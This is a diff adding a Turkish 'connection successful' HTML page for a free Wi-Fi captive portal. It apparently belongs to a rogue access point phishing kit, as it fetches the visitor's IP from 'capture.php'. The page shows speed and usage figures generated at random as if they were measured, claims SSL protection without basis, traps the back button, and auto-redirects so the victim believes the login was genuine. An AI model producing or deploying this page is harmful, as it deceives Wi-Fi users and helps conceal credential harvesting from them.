@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bağlantı Başarılı - Wi-Fi Erişimi</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,">
+    
+    <!-- Security Headers -->
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="refresh" content="30;url=https://www.google.com">
+    
+    <!-- Mobile Optimization -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="wifi-icon">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M1 9L12 20L23 9C18.5 4.5 5.5 4.5 1 9Z" stroke="#28a745" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M5 13L12 20L19 13C16.5 10.5 7.5 10.5 5 13Z" stroke="#28a745" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M9 17L12 20L15 17C13.5 15.5 10.5 15.5 9 17Z" stroke="#28a745" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <circle cx="12" cy="20" r="1" fill="#28a745"/>
+                </svg>
+            </div>
+            <h1>🎉 Bağlantı Başarılı!</h1>
+            <p>Wi-Fi ağına başarıyla bağlandınız</p>
+        </div>
+
+        <div class="content">
+            <div class="success-message">
+                <div class="success-icon">
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="#28a745" stroke-width="2"/>
+                        <path d="M9 12L11 14L15 10" stroke="#28a745" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                
+                <h2>İnternet Erişiminiz Hazır!</h2>
+                <p class="success-description">
+                    Kimlik doğrulama işleminiz başarıyla tamamlandı. 
+                    Artık ücretsiz Wi-Fi ağımızı kullanarak internete erişebilirsiniz.
+                </p>
+            </div>
+
+            <div class="connection-details">
+                <h3>🔗 Bağlantı Bilgileri</h3>
+                <div class="detail-grid">
+                    <div class="detail-item">
+                        <span class="detail-label">Ağ Adı:</span>
+                        <span class="detail-value" id="network-name">Free_WiFi</span>
+                        <span class="status-indicator status-online"></span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Bağlantı Durumu:</span>
+                        <span class="detail-value">Aktif</span>
+                        <span class="status-indicator status-online"></span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">IP Adresi:</span>
+                        <span class="detail-value" id="ip-address">Alınıyor...</span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Bağlantı Hızı:</span>
+                        <span class="detail-value">Yüksek Hız</span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Güvenlik:</span>
+                        <span class="detail-value">SSL Korumalı</span>
+                        <span class="security-badge">🔒</span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Oturum Süresi:</span>
+                        <span class="detail-value" id="session-time">24 Saat</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="quick-actions">
+                <h3>🚀 Hızlı Erişim</h3>
+                <div class="action-buttons">
+                    <a href="https://www.google.com" class="btn btn-primary" target="_blank">
+                        <span class="btn-icon">🔍</span>
+                        Google'da Ara
+                    </a>
+                    
+                    <a href="https://www.youtube.com" class="btn btn-secondary" target="_blank">
+                        <span class="btn-icon">📺</span>
+                        YouTube
+                    </a>
+                    
+                    <a href="https://www.facebook.com" class="btn btn-secondary" target="_blank">
+                        <span class="btn-icon">📘</span>
+                        Facebook
+                    </a>
+                    
+                    <a href="https://www.instagram.com" class="btn btn-secondary" target="_blank">
+                        <span class="btn-icon">📷</span>
+                        Instagram
+                    </a>
+                </div>
+            </div>
+
+            <div class="usage-info">
+                <h3>📊 Kullanım Bilgileri</h3>
+                <div class="usage-stats">
+                    <div class="stat-item">
+                        <div class="stat-icon">📈</div>
+                        <div class="stat-content">
+                            <div class="stat-label">İndirme Hızı</div>
+                            <div class="stat-value" id="download-speed">-- Mbps</div>
+                        </div>
+                    </div>
+                    
+                    <div class="stat-item">
+                        <div class="stat-icon">📤</div>
+                        <div class="stat-content">
+                            <div class="stat-label">Yükleme Hızı</div>
+                            <div class="stat-value" id="upload-speed">-- Mbps</div>
+                        </div>
+                    </div>
+                    
+                    <div class="stat-item">
+                        <div class="stat-icon">⏱️</div>
+                        <div class="stat-content">
+                            <div class="stat-label">Ping</div>
+                            <div class="stat-value" id="ping">-- ms</div>
+                        </div>
+                    </div>
+                    
+                    <div class="stat-item">
+                        <div class="stat-icon">📊</div>
+                        <div class="stat-content">
+                            <div class="stat-label">Veri Kullanımı</div>
+                            <div class="stat-value" id="data-usage">0 MB</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn btn-secondary" onclick="runSpeedTest()">
+                    <span class="btn-icon">🔄</span>
+                    Hız Testi Yap
+                </button>
+            </div>
+
+            <div class="tips-section">
+                <h3>💡 Kullanım İpuçları</h3>
+                <div class="tips-grid">
+                    <div class="tip-item">
+                        <div class="tip-icon">🔒</div>
+                        <div class="tip-content">
+                            <h4>Güvenli Gezinme</h4>
+                            <p>Hassas bilgilerinizi girerken HTTPS sitelerini tercih edin.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="tip-item">
+                        <div class="tip-icon">⚡</div>
+                        <div class="tip-content">
+                            <h4>Hızlı Bağlantı</h4>
+                            <p>En iyi performans için cihazınızı modem yakınında tutun.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="tip-item">
+                        <div class="tip-icon">📱</div>
+                        <div class="tip-content">
+                            <h4>Çoklu Cihaz</h4>
+                            <p>Aynı hesapla birden fazla cihaz bağlayabilirsiniz.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="tip-item">
+                        <div class="tip-icon">🕒</div>
+                        <div class="tip-content">
+                            <h4>Oturum Süresi</h4>
+                            <p>Bağlantınız 24 saat boyunca aktif kalacaktır.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="support-section">
+                <h3>🆘 Destek ve Yardım</h3>
+                <div class="support-content">
+                    <p>Bağlantı sorunları yaşıyorsanız:</p>
+                    <ul>
+                        <li>Cihazınızın Wi-Fi ayarlarını kontrol edin</li>
+                        <li>Tarayıcınızın önbelleğini temizleyin</li>
+                        <li>Cihazınızı yeniden başlatmayı deneyin</li>
+                        <li>Sorun devam ederse teknik destek ile iletişime geçin</li>
+                    </ul>
+                    
+                    <div class="support-buttons">
+                        <button class="btn btn-secondary" onclick="showTroubleshooting()">
+                            <span class="btn-icon">🔧</span>
+                            Sorun Giderme
+                        </button>
+                        
+                        <button class="btn btn-secondary" onclick="contactSupport()">
+                            <span class="btn-icon">📞</span>
+                            Teknik Destek
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>📡 Ağ Bilgileri</h4>
+                    <p>Bu ağ ücretsiz Wi-Fi hizmeti sunmaktadır.</p>
+                    <p>Kullanım koşullarına uygun şekilde kullanınız.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>🔐 Gizlilik</h4>
+                    <p>Bağlantı logları güvenlik amaçlı tutulmaktadır.</p>
+                    <p>Kişisel verileriniz korunmaktadır.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>⏰ Çalışma Saatleri</h4>
+                    <p>7/24 kesintisiz hizmet</p>
+                    <p>Teknik destek: 09:00 - 18:00</p>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>&copy; 2024 Free WiFi Service. Tüm hakları saklıdır.</p>
+                <p class="auto-redirect">Bu sayfa 30 saniye sonra otomatik olarak Google'a yönlendirilecektir.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for troubleshooting -->
+    <div id="modal-overlay" class="modal-overlay" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modal-title">Sorun Giderme</h3>
+                <span class="modal-close" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body" id="modal-body">
+                <!-- Modal content will be inserted here -->
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal()">Kapat</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Page initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get network name from URL or use default
+            const urlParams = new URLSearchParams(window.location.search);
+            const ssid = urlParams.get('ssid') || 'Free_WiFi';
+            document.getElementById('network-name').textContent = ssid;
+            
+            // Get user's IP address
+            getUserIP();
+            
+            // Start session timer
+            startSessionTimer();
+            
+            // Simulate speed test data
+            simulateNetworkStats();
+            
+            // Show success animation
+            showSuccessAnimation();
+        });
+
+        // Get user's IP address
+        function getUserIP() {
+            fetch('capture.php?action=get_ip')
+                .then(response => response.text())
+                .then(ip => {
+                    document.getElementById('ip-address').textContent = ip;
+                })
+                .catch(() => {
+                    document.getElementById('ip-address').textContent = 'Alınamadı';
+                });
+        }
+
+        // Session timer
+        function startSessionTimer() {
+            const startTime = new Date();
+            
+            setInterval(() => {
+                const now = new Date();
+                const elapsed = Math.floor((now - startTime) / 1000);
+                const hours = Math.floor(elapsed / 3600);
+                const minutes = Math.floor((elapsed % 3600) / 60);
+                const seconds = elapsed % 60;
+                
+                const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                document.getElementById('session-time').textContent = timeString;
+            }, 1000);
+        }
+
+        // Simulate network statistics
+        function simulateNetworkStats() {
+            // Simulate realistic values
+            const downloadSpeed = (Math.random() * 50 + 10).toFixed(1);
+            const uploadSpeed = (Math.random() * 20 + 5).toFixed(1);
+            const ping = Math.floor(Math.random() * 50 + 10);
+            
+            document.getElementById('download-speed').textContent = downloadSpeed + ' Mbps';
+            document.getElementById('upload-speed').textContent = uploadSpeed + ' Mbps';
+            document.getElementById('ping').textContent = ping + ' ms';
+            
+            // Simulate data usage counter
+            let dataUsage = 0;
+            setInterval(() => {
+                dataUsage += Math.random() * 0.1;
+                document.getElementById('data-usage').textContent = dataUsage.toFixed(1) + ' MB';
+            }, 5000);
+        }
+
+        // Success animation
+        function showSuccessAnimation() {
+            const successIcon = document.querySelector('.success-icon');
+            successIcon.style.animation = 'bounce 0.6s ease-in-out';
+        }
+
+        // Speed test simulation
+        function runSpeedTest() {
+            const button = event.target;
+            const originalText = button.innerHTML;
+            
+            button.innerHTML = '<span class="loading-spinner"></span> Test Yapılıyor...';
+            button.disabled = true;
+            
+            setTimeout(() => {
+                simulateNetworkStats();
+                button.innerHTML = originalText;
+                button.disabled = false;
+                
+                // Show notification
+                showNotification('Hız testi tamamlandı!', 'success');
+            }, 3000);
+        }
+
+        // Show troubleshooting modal
+        function showTroubleshooting() {
+            document.getElementById('modal-title').textContent = 'Sorun Giderme Rehberi';
+            document.getElementById('modal-body').innerHTML = `
+                <h4>Yaygın Sorunlar ve Çözümleri</h4>
+                
+                <div class="troubleshoot-item">
+                    <h5>🚫 İnternet Sayfaları Açılmıyor</h5>
+                    <ul>
+                        <li>Tarayıcınızı kapatıp yeniden açın</li>
+                        <li>DNS ayarlarınızı kontrol edin (8.8.8.8, 8.8.4.4)</li>
+                        <li>Proxy ayarlarını devre dışı bırakın</li>
+                    </ul>
+                </div>
+                
+                <div class="troubleshoot-item">
+                    <h5>🐌 Yavaş İnternet</h5>
+                    <ul>
+                        <li>Cihazınızı modeme yaklaştırın</li>
+                        <li>Diğer uygulamaları kapatın</li>
+                        <li>Tarayıcı önbelleğini temizleyin</li>
+                    </ul>
+                </div>
+                
+                <div class="troubleshoot-item">
+                    <h5>🔄 Bağlantı Kopuyor</h5>
+                    <ul>
+                        <li>Wi-Fi ayarlarından ağı unutup yeniden bağlanın</li>
+                        <li>Cihazınızı yeniden başlatın</li>
+                        <li>Güç tasarrufu modunu kapatın</li>
+                    </ul>
+                </div>
+                
+                <div class="troubleshoot-item">
+                    <h5>📱 Mobil Cihaz Sorunları</h5>
+                    <ul>
+                        <li>Mobil veriyi kapatın</li>
+                        <li>Uçak modunu açıp kapatın</li>
+                        <li>Ağ ayarlarını sıfırlayın</li>
+                    </ul>
+                </div>
+            `;
+            document.getElementById('modal-overlay').style.display = 'flex';
+        }
+
+        // Contact support
+        function contactSupport() {
+            document.getElementById('modal-title').textContent = 'Teknik Destek';
+            document.getElementById('modal-body').innerHTML = `
+                <h4>İletişim Bilgileri</h4>
+                <p>Sorunlarınız için aşağıdaki kanallardan bize ulaşabilirsiniz:</p>
+                
+                <div class="contact-info">
+                    <div class="contact-item">
+                        <strong>📞 Telefon:</strong> 0850 XXX XX XX
+                    </div>
+                    <div class="contact-item">
+                        <strong>📧 E-posta:</strong> destek@freewifi.com
+                    </div>
+                    <div class="contact-item">
+                        <strong>💬 Canlı Destek:</strong> 7/24 aktif
+                    </div>
+                    <div class="contact-item">
+                        <strong>🕒 Çalışma Saatleri:</strong> 09:00 - 18:00
+                    </div>
+                </div>
+                
+                <h4>Hızlı Çözüm</h4>
+                <p>Çoğu sorun aşağıdaki adımlarla çözülebilir:</p>
+                <ol>
+                    <li>Cihazınızı yeniden başlatın</li>
+                    <li>Wi-Fi bağlantısını yenileyin</li>
+                    <li>Tarayıcı önbelleğini temizleyin</li>
+                    <li>Sorun devam ederse bizimle iletişime geçin</li>
+                </ol>
+            `;
+            document.getElementById('modal-overlay').style.display = 'flex';
+        }
+
+        // Close modal
+        function closeModal() {
+            document.getElementById('modal-overlay').style.display = 'none';
+        }
+
+        // Show notification
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.classList.add('show');
+            }, 100);
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => {
+                    document.body.removeChild(notification);
+                }, 300);
+            }, 3000);
+        }
+
+        // Prevent back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+
+        // Auto redirect countdown
+        let countdown = 30;
+        const countdownElement = document.querySelector('.auto-redirect');
+        
+        setInterval(() => {
+            countdown--;
+            countdownElement.textContent = `Bu sayfa ${countdown} saniye sonra otomatik olarak Google'a yönlendirilecektir.`;
+            
+            if (countdown <= 0) {
+                window.location.href = 'https://www.google.com';
+            }
+        }, 1000);
+
+        // Add bounce animation CSS
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes bounce {
+                0%, 20%, 60%, 100% {
+                    transform: translateY(0);
+                }
+                40% {
+                    transform: translateY(-10px);
+                }
+                80% {
+                    transform: translateY(-5px);
+                }
+            }
+            
+            .notification {
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #28a745;
+                color: white;
+                padding: 15px 20px;
+                border-radius: 5px;
+                transform: translateX(100%);
+                transition: transform 0.3s ease;
+                z-index: 1000;
+            }
+            
+            .notification.show {
+                transform: translateX(0);
+            }
+            
+            .notification-success {
+                background: #28a745;
+            }
+            
+            .notification-error {
+                background: #dc3545;
+            }
+            
+            .notification-info {
+                background: #17a2b8;
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
